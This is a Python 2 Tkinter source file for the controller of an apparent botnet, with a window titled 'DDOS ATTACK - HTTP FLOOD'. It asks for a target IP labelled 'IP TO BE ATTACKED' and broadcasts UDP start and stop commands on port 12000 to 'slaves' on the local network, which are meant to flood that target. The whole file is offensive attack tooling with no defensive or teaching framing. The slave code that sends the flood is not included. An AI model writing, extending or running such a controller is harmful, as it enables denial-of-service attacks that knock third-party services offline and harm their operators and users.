from Tkinter import Tk, Label, Button, Entry, StringVar, DISABLED, NORMAL, END, W, E
from socket import *
from functools import partial
import random

def is_valid_ipv4(ip):
    parts = ip.split('.')

    return (    len(parts) == 4
                and all(part.isdigit() for part in parts)
                and all(0 <= int(part) <= 255 for part in parts)
           )


class Interface:

    def __init__(self, master):



        serverPort = 12000
        clientAddress = '255.255.255.255'
        serverSocket = socket(AF_INET, SOCK_DGRAM)
        serverSocket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
        serverSocket.setsockopt(SOL_SOCKET, SO_BROADCAST, 1)
        serverSocket.bind(('', serverPort))

        self.master = master
        master.title("              DDOS ATTACK - HTTP FLOOD")

        self.IP = None

        self.message = "TYPE IP TO BE ATTACKED :"
        self.label_text = StringVar()
        self.label_text.set(self.message)
        self.label = Label(master, textvariable=self.label_text,font=(None, 13),background ="black",fg ="white")

        vcmd = master.register(self.validate) # we have to wrap the command



        self.entry = Entry(master, validate="key", validatecommand=(vcmd, '%P'))
        self.entry.configure(insertwidth=2,highlightbackground= "black")


        validate_ip_args = partial(self.validate_IP, serverSocket, clientAddress, serverPort)
        self.attack_button = Button(master, text="Start Attack", command=validate_ip_args, height = 2, width = 20,  font=(None, 13), fg ="white", background ="black",highlightbackground= "black")

        stop_attack_args = partial(self.stop_attack, serverSocket, clientAddress, serverPort)
        self.stop_button = Button(master, text="Stop Attack", command=stop_attack_args, state=DISABLED, height = 2, width = 20, font=(None, 13), fg ="white", background = "black",highlightbackground= "black")


        self.label.grid(row=0, column=0, columnspan=2, sticky=W+E,  pady=20)
        self.entry.grid(row=1, column=0, columnspan=2, sticky=W+E, pady= 8)
        self.attack_button.grid(row=2, column=0, padx= 5,pady= 8)
        self.stop_button.grid(row=2, column=1, padx= 5, pady= 8)


    def validate(self, new_text):
        if not new_text: # the field is being cleablack
            self.IP = None
            return True
        else:
            IP = new_text
            self.IP=IP
            return True

    def validate_IP(self, serverSocket, clientAddress, serverPort):

        if (is_valid_ipv4(str(self.IP))):
            self.message = "VALID IP, CONTACTING SLAVES!"
            serverSocket.sendto("S/"+self.IP, (clientAddress, serverPort))
            self.attack_button.configure(state=DISABLED)
            self.stop_button.configure(state=NORMAL)
        else:
            self.message = "INVALID IP, TRY AGAIN"

        if self.IP is None:
            self.message = "TYPE IP TO BE ATTACKED :"

        self.label_text.set(self.message)

    def stop_attack(self, serverSocket, clientAddress, serverPort):
        self.entry.delete(0, END)

        self.IP = None
        serverSocket.sendto("B/", (clientAddress, serverPort))

        self.message = "TYPE IP TO BE ATTACKED :"
        self.label_text.set(self.message)

        self.attack_button.configure(state=NORMAL)
        self.stop_button.configure(state=DISABLED)

root = Tk()

my_gui = Interface(root)
root.configure(background='black')

root.mainloop()
